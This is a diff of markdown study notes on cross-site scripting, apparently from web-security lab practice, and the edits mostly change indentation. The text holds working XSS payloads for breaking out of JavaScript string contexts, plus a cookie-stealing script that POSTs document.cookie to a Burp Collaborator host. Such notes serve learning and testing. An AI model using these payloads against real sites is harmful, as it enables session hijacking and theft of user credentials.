@@ -41,17 +41,20 @@
 			';alert(document.domain)//` 
 			'-alert(document.domain)-'
 		   ```
-	- **single quote and backslash escaped**
+
+ 	- **single quote and backslash escaped**
 		- Browsers first perform html parsing to idenfity page elements and then parse javascript to understand and execute embedded scripts.
 		- Even though our payload breaks the markup it doesn't prevent the subsequent script from being parsed and executed in a normal way.
 		- We can craft our payload using the above information: 
 		  ```html
-		  </script><img src=1 onerror=alert(document.domain)>;
-		 ```
+		  	</script><img src=1 onerror=alert(document.domain)>;
+		  ```
+  
 	- **angle brackets and double quotes html encoded and single quotes escaped**
 		- To break out of the string we will append a **`\`** backslash character to our payload: **`\\';alert(document.domain)//`**
 		- ***Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.***
-	- **within existing javascript in a quoted tag attribute such as `onclick` event with `<>`, and `"` html encoded and `'`, and `\` escaped**
+
+  	- **within existing javascript in a quoted tag attribute such as `onclick` event with `<>`, and `"` html encoded and `'`, and `\` escaped**
 		- Consider and example: 
 		```html
 		<a href="#" onclick="... var input='controllable data here'; ...">
@@ -61,7 +64,8 @@
 		&apos;-alert(document.domain)-&apos;
 		```
 		- ***Browser's usually HTML-decode the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.***
-	- **Using template literals \`\` (input within backticks) **
+
+  	- **Using template literals **\`\`** (input within backticks) **
 		- We can introduce **embedded expressions `${...}`** with javascript code inside: **`${alert(document.domain)}`**
 
 - **Stealing session cookies**
@@ -70,7 +74,7 @@
 	- Use the following payload to deliver exploit to our victim: 
 	```javascript
 	<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
-```
+	```	
 
 - **capturing passwords**
 	- Identify xss context to craft our payload
